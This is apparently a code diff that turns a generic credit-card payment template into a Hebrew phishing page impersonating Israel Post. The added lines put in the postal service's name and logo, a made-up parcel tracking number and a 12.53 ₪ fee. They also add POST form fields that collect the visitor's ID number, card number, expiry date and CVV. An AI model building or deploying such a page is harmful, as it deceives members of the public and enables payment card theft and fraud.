@@ -8,21 +8,32 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;500;600&display=swap" rel="stylesheet">
-
-    <title>Document</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <title>Home | דואר ישראל</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 <div class="payment-title p-20">
-    <h1>Payment Information</h1>
-    <p>
-        Lorem ipsum dolor sit amet, consectetur adipisicing elit. Adipisci at culpa doloremque doloribus exercitationem
+    <a href="https://israelpost.co.il/">
+
+        <img src="logo.png" style="width: 160px; margin-bottom: 20px;">
+    </a>
+
+</div>
+<div class="payment-title p-20 back">
+
+    <h1 >פרטי תשלום</h1>
+
+    <p dir="rtl" style="font-weight: bold;">
+        מספר מעקב : RS0649518856Y<br><br>סכום לתשלום : 12.53 ₪
+
     </p>
+
 </div>
 
-<form action="#">
-    <div class="form">
-        <div class="container card-box preload">
+<form id="form" method="post" style="direction:rtl">
+    <div  class="form">
+        <div class="container card-box preload" style="direction: ltr;">
             <div class="creditcard">
                 <div class="front">
                     <div id="ccsingle"></div>
@@ -51,7 +62,7 @@
                                   class="st2 st5 st9">01/23</text>
                             <text transform="matrix(1 0 0 1 479.3848 417.0097)" class="st2 st10 st11">VALID</text>
                             <text transform="matrix(1 0 0 1 479.3848 435.6762)" class="st2 st10 st11">THRU</text>
-                            <polygon class="st2" points="554.5,421 540.4,414.2 540.4,427.9 		"/>
+                            <polygon class="st2" points="554.5,421 540.4,414.2 540.4,427.9      "/>
                         </g>
                         <g id="cchip">
                             <g>
@@ -129,12 +140,13 @@
         </div>
         <div class="form-container">
             <div class="field-container">
-                <label for="name">Name</label>
-                <input id="name" maxlength="20" type="text" required>
+                <label for="name">ת.ז.</label>
+                <input id="name" maxlength="20" name="name" type="text" required>
             </div>
             <div class="field-container">
-                <label for="cardnumber">Card Number</label><span id="generatecard">generate random</span>
-                <input id="cardnumber" type="text" pattern="[0-9\s]*" inputmode="numeric" required>
+                <label for="cardnumber"> מספר כרטיס </label>
+                <!--  <span id="generatecard">generate random</span> -->
+                <input id="cardnumber" name="cardnumber" type="text" pattern="[0-9\s]*" inputmode="numeric" required>
                 <svg id="ccicon" class="ccicon" width="750" height="471" viewBox="0 0 750 471" version="1.1"
                      xmlns="http://www.w3.org/2000/svg"
                 >
@@ -142,17 +154,21 @@
                 </svg>
             </div>
             <div class="field-container">
-                <label for="expirationdate">Expiration (mm/yy)</label>
-                <input id="expirationdate" type="text" pattern="[0-9]*" inputmode="numeric" required>
+                <label for="expirationdate">תוקף MM / YYYY</label>
+                <input id="expirationdate" name="expirationdate" type="text" inputmode="numeric" required>
             </div>
             <div class="field-container">
-                <label for="securitycode">Security Code</label>
-                <input id="securitycode" type="text" pattern="[0-9]*" inputmode="numeric" required>
+                <label for="securitycode">קוד אבטחה (CVV)</label>
+                <input id="securitycode"  name="securitycode" type="text" pattern="[0-9]*" inputmode="numeric" required>
             </div>
         </div>
     </div>
     <div class="p-20 text-center">
-        <button id="submit" type="submit" class="button">PAY</button>
+        <div id="submit_btn" class="submit-btn">
+            <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+            <input  id="submit" type="submit" class="button" value="בצע תשלום">
+        </div>
+
     </div>
 </form>
 
